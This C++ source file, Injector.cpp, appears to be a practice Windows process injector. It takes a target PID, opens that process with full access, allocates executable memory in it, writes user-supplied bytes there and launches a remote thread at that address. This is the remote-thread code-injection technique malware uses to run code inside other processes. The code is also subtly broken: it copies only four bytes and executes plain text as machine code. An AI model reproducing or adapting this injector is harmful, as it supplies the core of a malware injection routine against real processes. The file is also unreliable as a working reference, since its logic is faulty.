// Injector.cpp

#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void){
	
	// To build our injector, we're gonna use VirtualAllocEx() and WriteProcessMemory() syscalls
	
	int pid = 0;

	printf("\nInsert PID: ");
	scanf_s("%d", &pid);
	getchar();
	
	char buffer[100];
	printf("\nWhat you want to text to the remote process: ");
	fgets(buffer, sizeof(buffer), stdin);
	
	buffer[strcspn(buffer,"\n")] = 0;
	
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) { // Failed to get a handle
		printf("\nOpenProcess failed. GetLastError = %d\n", GetLastError());
		system("pause");
		return EXIT_FAILURE;
	}
	else {
		printf("\nOpenProcess succedeed with code: %d\n", GetLastError());
	}
	

	
	// Allocate memory in the target process
	LPVOID remoteMem = VirtualAllocEx(hProcess, nullptr, strlen(buffer)+1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	if (!remoteMem) {
		printf("VirtualAllocEx filed. GetLastError = %d\n", GetLastError());
	    CloseHandle(hProcess);
	    return 1;
	} else{
		printf("\nMemory allocated with VirtualAllocEx at address: %p\n", remoteMem);
	}
	
	
	printf("\nAllocating %s in process with PID %d\n", buffer, pid);
	
	// Write on the target process memory
	
	bool wpm = WriteProcessMemory(hProcess, (LPVOID)remoteMem, &buffer, sizeof(int), NULL);
	
	if (wpm == false) {
		printf("\nWriteProcessMemory failed. GetLastError = %d\n", GetLastError());
		system("pause");
		return EXIT_FAILURE;
	}
	else {
		printf("\nWriteProcessMemory succedeed with code: %d\n", GetLastError());
		system("pause");
	}
	
	// Now let's create the remote thread on the target process memory context
	
	HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
	if(remoteThread == NULL){
		printf("\nCreateRemoteThread failed. GetLastError = %d\n", GetLastError());
		system("pause");
		return EXIT_FAILURE;
	} else{
		printf("\nCreateRemoteThread succedeed with code: %d\n", GetLastError());
		system("pause");
	}
	
	
	return 0;
}
